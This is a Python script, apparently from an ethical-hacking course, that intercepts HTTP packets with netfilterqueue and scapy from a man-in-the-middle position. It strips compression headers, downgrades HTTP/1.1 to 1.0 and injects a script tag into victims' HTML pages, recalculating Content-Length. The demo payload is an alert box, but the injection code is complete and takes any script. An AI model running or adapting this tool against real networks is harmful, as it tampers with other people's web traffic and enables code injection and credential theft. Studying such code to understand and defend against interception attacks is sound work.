import netfilterqueue
import scapy.all as scapy
import re

# only works for http, not https

def set_load(scapy_packet, load):

    scapy_packet[scapy.Raw].load = load

    # delete all fields that will be modified because of the above line.
    # scapy will automatically recalculate the new values
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet

def process_packet(packet):

    # convert the netfilterqueue packet into a scapy packet, in order to access the layers with scapy.
    scapy_packet = scapy.IP(packet.get_payload())

    # checks if the packet has a http layer and raw data where downloads are at.
    if scapy_packet.haslayer(scapy.Raw):

        packet_load = scapy_packet[scapy.Raw].load

        # http request. Remove the encoding to read html
        if scapy_packet[scapy.TCP].dport == 10000:

            print("[+] Request")

            # replace the 'accept encoding' field in the packet and replace it by nothing
            # regex: accept all characters and any number after "accept encoding. Non greedy (?): stop at first occurence of \r\n
            # re.sub returns the modifed string
            packet_load = re.sub("Accept-Encoding:.*?\\r\\n", "", packet_load)

            #replace all http 1.1 to 1.0, since http 1.1 allows packets to be sent in chunks, and hence no content length
            packet_load = packet_load.replace("HTTP/1.1", "HTTP/1.0")

        # http response. inject malicious code into the html
        elif scapy_packet[scapy.TCP].sport == 10000:

            print("[+] Response")

            injection_code = "<script>alert('test');</script>"


            # Modify the response packet. Replace the </body> tag with javascript code, then close the body: </body>
            packet_load = packet_load.replace("</body>", injection_code + "</body>")

            # extract the value of content length matches of the html code from the response (returns a group).
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", packet_load)

            # some browsers may not have content length field.
            # only recalculate the content length if there is html code being loaded.
            if content_length_search and "text/html" in packet_load:

                content_length = content_length_search.group(1) # we only want the digits, so return group 1 instead of 0

                new_content_length = int(content_length) + len(injection_code)

                packet_load = packet_load.replace(content_length, str(new_content_length)) # replace content length in the load


        # check if packet load got modified. if yes, create new packet with modified load.
        if(packet_load != scapy_packet[scapy.Raw].load):
            new_packet = set_load(scapy_packet, packet_load)
            packet.set_payload(str(new_packet))

    packet.accept() #accepts packets to pass through the queue

#   packet.drop() # drops packets


queue = netfilterqueue.NetfilterQueue() # create a NF queue object

# binds queue to the queue created in the terminal (with queue-num = 0) with the above command.
# process_packet is the call back function to execute each time a packet comes in
queue.bind(0, process_packet)
queue.run()